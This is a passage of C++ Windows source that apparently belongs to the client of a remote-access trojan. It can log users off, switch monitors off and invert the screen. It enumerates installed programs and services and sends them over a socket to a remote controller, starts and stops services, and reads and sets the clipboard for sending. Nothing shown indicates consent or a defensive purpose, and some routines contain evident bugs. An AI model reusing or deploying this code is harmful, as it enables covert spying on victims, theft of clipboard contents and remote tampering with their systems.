ExitWindowsEx(EWX_LOGOFF, 0);
}

void TurnMonitorOff()
{
SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2);
}
void TurnMonitorOn()
{
SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) -1);
}

void InvertScreen()
{
    HDC hdc = GetWindowDC(NULL);
    long color;

    for (int x = 0; x < GetSystemMetrics(SM_CXSCREEN); x++)
    {
        for (int y = 0; y < GetSystemMetrics(SM_CYSCREEN); y++)
        {
            color = GetPixel(hdc, x, y);
            color <<= 8;
            color = ~color;
            color >>= 8;
            SetPixel(hdc, x, y, color);
        }
    }
    ReleaseDC(NULL, hdc);
}


//////////////////////////////////////////////////////////////////////////////////
//ProgramList
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

int QueryInstalls()
{

	HKEY hKey;
    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name
    DWORD    cchClassName = MAX_PATH;  // size of class string
    DWORD    cSubKeys=0;               // number of subkeys
    DWORD    cbMaxSubKey;              // longest subkey size
    DWORD    cchMaxClass;              // longest class string
    DWORD    cValues;              // number of values for key
    DWORD    cchMaxValue;          // longest value name
    DWORD    cbMaxValueData;       // longest value data
    DWORD    cbSecurityDescriptor; // size of security descriptor
    FILETIME ftLastWriteTime;      // last write time
    char     Value [1024] = "";
    DWORD i, retCode;


    char NEW [1024] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\";
    char NEW0 [1024];
    char data [1024] = "";
    unsigned long datalen = sizeof(data);
    unsigned long datatype;
    HKEY hKkey;
    HKEY rKey;


//    TCHAR  achValue[MAX_VALUE_NAME];
    DWORD cchValue = MAX_VALUE_NAME;

       RegOpenKeyEx(HKEY_LOCAL_MACHINE,NEW,0,KEY_READ, &hKey);

    // Get the class name and the value count.
        RegQueryInfoKey(
        hKey,                    // key handle
        achClass,                // buffer for class name
        &cchClassName,           // size of class string
        NULL,                    // reserved
        &cSubKeys,               // number of subkeys
        &cbMaxSubKey,            // longest subkey size
        &cchMaxClass,            // longest class string
        &cValues,                // number of values for this key
        &cchMaxValue,            // longest value name
        &cbMaxValueData,         // longest value data
        &cbSecurityDescriptor,   // security descriptor
        &ftLastWriteTime);       // last write time

    // Enumerate the subkeys, until RegEnumKeyEx fails.

    if (cSubKeys)
    {
       //printf( "\nNumber of subkeys: %d\n", cSubKeys);
       cout<<cSubKeys<<endl;

        for (i=0; i<cSubKeys; i++)
        {
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i,
                     achKey,
                     &cbName,
                     NULL,
                     NULL,
                     NULL,
                     &ftLastWriteTime);
                     cout<<achKey<<endl;
            if (retCode == ERROR_SUCCESS)
            {
                strcpy(NEW0, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\");
                strcat(NEW0, achKey);

				if (!RegOpenKeyExA(HKEY_LOCAL_MACHINE, NEW0, NULL, KEY_QUERY_VALUE, &hKkey) == ERROR_SUCCESS)
                 {
                 //MessageBox(NULL,"FAIL","FAIL", MB_OK);
                 //cout<<"FAIL\n";
                 }

if (RegQueryValueExA(hKkey, "", NULL, &datatype, (unsigned char *)data,  &datalen) == ERROR_SUCCESS)
{
     lstrcpy(SEND.Path, data);
     lstrcpy(SEND.Installs, achKey);

     SEND.PacketType = SEND_INSTALLS;
     send(Socket,(char*)&SEND,HeadSize,0);

}


                Sleep(30);

            }
        }
    }


    return 0;
}




DWORD startService(char *pServiceName)
{
  int lRetVal = 0;
  SC_HANDLE lSCManager;
  SC_HANDLE lService;
  int lFuncRetVal = 0;


  /*
   * Get a handle to the SCM database.
   *
   */

  if ((lSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL)
  {
    lRetVal = 1;
    goto END;
  }


  if ((lService = OpenService(lSCManager, pServiceName, SERVICE_ALL_ACCESS)) == NULL)
  {
    lRetVal = 2;
	goto END;
  }

  /*
   * Attempt to start the service.
   *
   */

  if (!StartService(lService, 0, NULL))
  {
    lRetVal = 3;
	goto END;
  }


END:

  if (lSCManager)
    CloseServiceHandle(lSCManager);

  if (lService)
    CloseServiceHandle(lService);

  enumservices();

  return(lRetVal);
}

DWORD stopService(char *pServiceName)
{
  DWORD lRetVal = 0;
  SERVICE_STATUS_PROCESS ssp;
  DWORD lwStartTime = GetTickCount();
  DWORD lBytesNeeded;
  DWORD lTimeout = 30000;
  SC_HANDLE lSCManager;
  SC_HANDLE lService;
  int lFuncRetVal = 0;



  /*
   * Get a handle to the SCM database.
   *
   */

  if ((lSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL)
  {
    lRetVal = 1;
	goto END;
  }

  /*
   * Get a handle to the service.
   *
   */

  if ((lService = OpenService(lSCManager, pServiceName, SERVICE_STOP|SERVICE_QUERY_STATUS|SERVICE_ENUMERATE_DEPENDENTS)) == NULL)
  {
    lRetVal = 2;
	goto END;
  }


  /*
   * Make sure the service is not already stopped.
   *
   */

  if (!QueryServiceStatusEx(lService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &lBytesNeeded))
  {
    lRetVal = 3;
    goto END;
  }

  if (ssp.dwCurrentState == SERVICE_STOPPED)
  {
    lRetVal = 4;
	goto END;
  }

  /*
   * If a stop is pending, wait for it.
   *
   */

  while (ssp.dwCurrentState == SERVICE_STOP_PENDING)
  {
    Sleep( ssp.dwWaitHint );
    if (!QueryServiceStatusEx(lService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &lBytesNeeded))
    {
      lRetVal = 5;
      goto END;
    }

    if ( ssp.dwCurrentState == SERVICE_STOPPED )
    {
      lRetVal = 6;
      goto END;
    }


    if (GetTickCount() - lwStartTime > lTimeout)
    {
      lRetVal = 7;
      goto END;
    }
  } // while (ssp.dwCu...



  /*
   * Send a stop code to the service.
   *
   */

  if (!ControlService(lService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &ssp))
  {
    lRetVal = 8;
    goto END;
  }



END:

  if (lService)
    CloseServiceHandle(lService);

  if (lSCManager)
    CloseServiceHandle(lSCManager);

  enumservices();

  return(lRetVal);
}





int enumservices()
{

char compname [MAX_COMPUTERNAME_LENGTH + 1];
DWORD cbComputerName = sizeof ( compname );
GetComputerName (compname, &cbComputerName );

//For enumerating services with service manager

ENUM_SERVICE_STATUS EnService[512];
SC_HANDLE ScManager,ScService; //Handle of service manager
DWORD cbBufSize=512*sizeof(ENUM_SERVICE_STATUS);
DWORD lpServicesReturned;
DWORD pcbBytesNeeded;
DWORD lpResumeHandle=0;

//For querying service info
DWORD dwBytesNeeded;
LPQUERY_SERVICE_CONFIG lpqscBuf;

//Open the service manager with all as desired access
ScManager = OpenSCManager(compname,NULL,SC_MANAGER_ALL_ACCESS);

char szStatus[255];
char szStartType[255];


if(ScManager==NULL)
{
printf("Error querying the service manager");
return 0;
}

if(::EnumServicesStatus(ScManager, SERVICE_WIN32, SERVICE_STATE_ALL, EnService, cbBufSize, &pcbBytesNeeded, &lpServicesReturned, &lpResumeHandle)==0)
{
printf("Error querying the service manager");
return 0;
}

for(int i=0;i< INT ( lpServicesReturned);i++)
{
	if((ScService=::OpenService(ScManager,EnService[i].lpServiceName,SERVICE_ALL_ACCESS))==NULL)
	{
	printf("Error opening service");
	}

//Allocate some memory in our buffer for the actual querying
	lpqscBuf = (LPQUERY_SERVICE_CONFIG) LocalAlloc(LPTR, 4096);
	if (lpqscBuf == NULL)
	{
	printf("Error allocating service query");
	strcpy(szStartType,"Unknown");
	}

//Retrieve the configuration info
	if (! QueryServiceConfig(ScService, lpqscBuf, 4096, &dwBytesNeeded) )
	{
	printf("Error querying service info");
	strcpy(szStartType,"Unknown");
	}

//Get the current services startup type
switch(lpqscBuf->dwStartType)
{
case SERVICE_AUTO_START:
strcpy(szStartType,"Automatic");
break;

case SERVICE_DEMAND_START:
strcpy(szStartType,"Manual");
break;

case SERVICE_DISABLED :
strcpy(szStartType,"Disabled");
break;
}

//Get the services current state
switch(EnService[i].ServiceStatus.dwCurrentState)
{
case SERVICE_PAUSED: //The service is in a paused state
strcpy(szStatus,"Paused");
break;

case SERVICE_RUNNING: // The service is running
strcpy(szStatus,"Running");
break;

case SERVICE_STOPPED:// The service is stopped
strcpy(szStatus,"Stopped");
break;

case SERVICE_START_PENDING: // The service is pending start
strcpy(szStatus,"Start pending");
break;

case SERVICE_STOP_PENDING : // The service is pending stoppage
strcpy(szStatus,"Stop pending");
break;
}
//Output the current services info to the console
strcpy(SEND.Srvcname,EnService[i].lpServiceName);
strcpy(SEND.SrvcDispname,EnService[i].lpDisplayName);
strcpy(SEND.SrvcStatus,szStatus);
strcpy(SEND.SrvcStartup,szStartType);

SEND.PacketType = SEND_SRVCS;
send(Socket,(char*)&SEND,HeadSize,0);

/*     ofstream file("Serv.txt",ios::app);
	 if(file.is_open())
	 {
	     file<<SEND.Srvcname<<endl;
         file<<SEND.SrvcDispname<<endl;
	     file<<SEND.SrvcStatus<<endl;
	     file<<SEND.SrvcStartup<<endl;


	 }
	 file.close();*/
Sleep(50);

}

return 0;
}




int SetClipboard(char *PasteClip)
{

  const size_t len = strlen(PasteClip)+1;
  HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE|GMEM_DDESHARE ,len);

  memcpy(GlobalLock(hMem),PasteClip,len);
  GlobalUnlock(hMem);

  if(OpenClipboard(NULL))
     EmptyClipboard();
     SetClipboardData(CF_TEXT,hMem);
  CloseClipboard();

  return 0;
}




int GetClipboard()
{
HANDLE Clip;
char *show;
string cliptext;
int i;

  if(OpenClipboard(NULL))
     Clip = GetClipboardData(CF_TEXT);
  CloseClipboard();

  while(((char*)Clip)[i] != 0)
  {
      cliptext += ((char*)Clip)[i];
      i++;
  }

  show = (char*)malloc(cliptext.size()+1);
  memcpy(show,cliptext.c_str(),cliptext.size()+1);

  ///cout<<show<<endl;
  lstrcpy(FSEND.ClipBoard,show);

  free(show);
  return 0;

}
















